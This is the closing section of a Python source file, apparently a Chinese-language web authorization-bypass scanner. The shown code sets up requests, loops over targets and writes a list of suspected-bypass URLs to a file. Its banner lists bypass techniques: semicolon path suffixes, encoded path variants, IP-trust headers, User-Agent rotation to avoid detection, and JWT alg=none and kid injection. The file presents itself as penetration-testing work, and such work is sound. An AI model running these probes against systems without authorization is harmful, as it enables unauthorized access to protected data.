    print(c_dim(" v3.7 补丁：AC分号后缀——;.js/;1.js/;a.js/;x=1.js/;jsessionid=1.js/.js;/.js;1/%3b.js/%253b.js 全形态矩阵"))
    print(c_dim("           + 静态后缀池 8→38 个(.htm/.mjs/.map/.svg/.webp/.woff2/.ttf/.xml/.pdf 等)"))
    print(c_dim("           + 借道前缀池 8→16 个 + 缓存欺骗可缓存后缀全量展开"))
    print(c_info(" v3.9 优化：终端彩色分级输出（--no-color 关闭，重定向到文件自动关闭）"
                 " + 单目标/全局收尾直出完整可疑 URL 清单并落盘，复制即可手工验证"))
    print(c_dim(" v4.2 增强：AF-AK 六类 URL 解析矩阵（百分号编码/反斜杠/点段/重复斜杠/路径查询边界/截断后缀）"))
    print(c_info(" v4.3 升级（对标 403 绕过技术文章 P0 清单）："
                 "修复 AF-AK 类别筛选失效 + IP 信任头字典 16→37 全量对齐"
                 " + UA 浏览器池默认随机轮换（--user-agent 固定，消除工具 UA 暴露）"
                 " + AL 协议切换（HTTP↔HTTPS 翻转×高价值路径变形）"
                 " + AM JWT 篡改（--probe-jwt：alg=none/签名剥离/claim 提升/kid 注入）"))
    print(c_info(" v4.5 升级（客户端保真层）：多值头 list[tuple] 承载（转发头/Host 探测不再被 dict 折叠）"
                 " + URL 字段级保真检测（yarl 改写字段显式标注并降置信）"
                 " + 新终态 ✕客户端丢弃（CRLF/非法头/URL 非法与网络失败明确区分）"
                 " + skip_auto_headers 抑制自动头 + 发送统计与覆盖完整度退出码（0/1/2）"))
    print(c_warn(" ⚠️  仅限对已获书面授权的目标使用！"))
    print(c_head("=" * 78))

    manager = RequestManager({
        "low_cookie": args.low_cookie,
        "high_cookie": args.high_cookie,
        "extra_headers": parse_headers(args.header),
        "proxy": args.proxy,
        "timeout": args.timeout,
        "tls_verify": args.tls_verify,
        "delay": args.delay,
        "jitter": args.jitter,
        # v4.3 [P0-3]: UA 伪装——空串走浏览器池随机轮换
        "user_agent": getattr(args, "user_agent", "") or "",
    })

    total_hits = total_reviews = 0
    # v3.9: 跨目标汇总可疑行——收尾统一直出完整 URL 清单
    all_hits, all_reviews = [], []
    for i, target in enumerate(targets, 1):
        print(c_head(f"\n########## [{i}/{len(targets)}] ##########"))
        if getattr(args, "fingerprint_only", False):
            await run_fingerprint_only(target, args, manager)
            continue
        h, r, hit_rows, review_rows = await run_target(target, args, args.out, manager)
        total_hits += h
        total_reviews += r
        all_hits.extend(hit_rows)
        all_reviews.extend(review_rows)

    await manager.close()

    print("\n" + c_head("=" * 78))
    print(c_head(f" 全部完成：{len(targets)} 个目标") + " | "
          + c_hit(f"★疑似绕过 {total_hits}") + " | "
          + c_rev(f"△需复核 {total_reviews}"))

    # v3.9: 全局可疑 URL 完整清单——全部目标汇总直出，复制即可手工验证
    if all_hits or all_reviews:
        print(c_head("\n ██████ 可疑 URL 完整清单（请逐条手工复核确认）██████"))
        if all_hits:
            print(c_hit(f"\n ★ 疑似绕过（{len(all_hits)} 个）——优先复核："))
            for i, row in enumerate(all_hits, 1):
                v, r = row["variant"], row["resp"]
                print(c_hit(f"  {i:>3}. [{v['method']}] {v['url']}"))
                detail = f"        类别 {v['cat']} | HTTP {r['code']} | 置信 {row.get('confidence', '-')}"
                if row.get("verify"):
                    detail += f" | {row['verify']}"
                if v.get("headers"):
                    detail += f" | 附加头: {json.dumps(v['headers'], ensure_ascii=False)}"
                print(c_dim(detail))
        if all_reviews:
            print(c_rev(f"\n △ 需人工复核（{len(all_reviews)} 个）："))
            for i, row in enumerate(all_reviews, 1):
                v, r = row["variant"], row["resp"]
                print(c_rev(f"  {i:>3}. [{v['method']}] {v['url']}"
                            f"  | HTTP {r['code']} | {row.get('note', '')}"))

        # 清单落盘（纯文本，无色码），与报告同前缀
        urls_file = f"{args.out}_suspicious_urls_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(urls_file, "w", encoding="utf-8") as f:
                f.write(f"# 可疑 URL 完整清单 | 生成时间 {time.strftime('%Y-%m-%d %H:%M:%S')}"
                        f" | ★疑似绕过 {len(all_hits)} | △需复核 {len(all_reviews)}\n\n")
                f.write(f"## ★ 疑似绕过（{len(all_hits)} 个）\n")
                for i, row in enumerate(all_hits, 1):
                    v, r = row["variant"], row["resp"]
                    f.write(f"{i:>3}. [{v['method']}] {v['url']}  | 类别 {v['cat']}"
                            f" | HTTP {r['code']} | 置信 {row.get('confidence', '-')}"
                            + (f" | {row['verify']}" if row.get("verify") else "")
                            + (f" | 附加头: {json.dumps(v['headers'], ensure_ascii=False)}"
                               if v.get("headers") else "")
                            + "\n")
                f.write(f"\n## △ 需人工复核（{len(all_reviews)} 个）\n")
                for i, row in enumerate(all_reviews, 1):
                    v, r = row["variant"], row["resp"]
                    f.write(f"{i:>3}. [{v['method']}] {v['url']}  | HTTP {r['code']}"
                            f" | {row.get('note', '')}\n")
            print(c_ok(f"\n[*] 可疑 URL 清单已保存: {urls_file}"))
        except OSError as e:
            print(c_bad(f"[-] 可疑 URL 清单写入失败: {e}"))

    print(c_dim(" 后续建议：对 ★ 项手工复核——确认响应体是否真实返回受保护数据（见证据目录），"))
    print(c_dim(" 并检查 Shiro 规则顺序、Spring Security anyRequest 兜底、Filter dispatcher 类型、"))
    print(c_dim(" AntPathMatcher 与 PathPattern 的版本差异等鉴权配置。"))
    print(c_dim(" v3.2：结合报告中的\"框架指纹\"板块，优先核对已识别组件对应的路径匹配差异点；"))
    print(c_dim(" 重定向链分析中的\"落点 2xx 且内容与基线差异显著\"项需人工确认是否为鉴权偏差。"))
    print(c_head("=" * 78))
    # v4.5: 发送保真统计 + 覆盖完整度退出码
    #   0=干净（无绕过且覆盖完整） / 1=发现绕过 /
    #   2=未发现绕过但存在客户端丢弃或URL改写，探测覆盖不全、结果不可信
    print_send_accounting(manager)
    sys.exit(fidelity_exit_adjust(manager, 1 if total_hits else 0))


def main():
    # v3.4 [P0-3] Windows GBK 控制台防护：★/✕/⚠ 等字符在 cp936 下会抛
    # UnicodeEncodeError 中断整个扫描，统一切 UTF-8 + replace
    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except (OSError, ValueError):
            pass
    args = parse_args()

    # v3.9: 初始化终端彩色输出（--no-color / NO_COLOR 环境变量 / 非 TTY 重定向时自动禁用）
    C.init(getattr(args, "no_color", False))

    # v3.1 [D3 修复] 旧参数名弃用提示
    if "--verify" in sys.argv:
        print(c_rev("[!] 提示：--verify 已更名为 --tls-verify（旧名仍兼容，后续版本将移除）"))
    if "--no-verify" in sys.argv:
        print(c_rev("[!] 提示：--no-verify 已更名为 --skip-recheck（旧名仍兼容，后续版本将移除）"))

    # 加载 YAML 配置
    if args.config:
        yaml_cfg = load_yaml_config(args.config)
        args = merge_config(args, yaml_cfg)

    # Cookie 文件兜底
    if not args.low_cookie and args.low_cookie_file:
        args.low_cookie = read_cookie_file(args.low_cookie_file)
    if not args.high_cookie and args.high_cookie_file:
        args.high_cookie = read_cookie_file(args.high_cookie_file)

    # CLI --exclude 优先于 YAML
    if args.exclude:
        args.exclude_variants = [e.strip() for e in args.exclude.split(",")]
    elif not getattr(args, "exclude_variants", None):
        args.exclude_variants = []

    # v3.8: collect_targets 统一返回 TargetSpec（URL + 方法/请求体/请求头/Cookie）
    targets = [t for t in collect_targets(args)
               if t.url.startswith("http://") or t.url.startswith("https://")]
    if not targets:
        print(c_bad("[-] 未提供有效目标（URL 必须以 http:// 或 https:// 开头）"))
        sys.exit(1)

    # v3.1: 干跑模式——只列变形，不发包（在默认值回填前执行，无需网络参数）
    if args.list_variants:
        cmd_list_variants(args, targets)
        sys.exit(0)

    apply_defaults(args)
    asyncio.run(async_main(args, targets))


if __name__ == "__main__":
    main()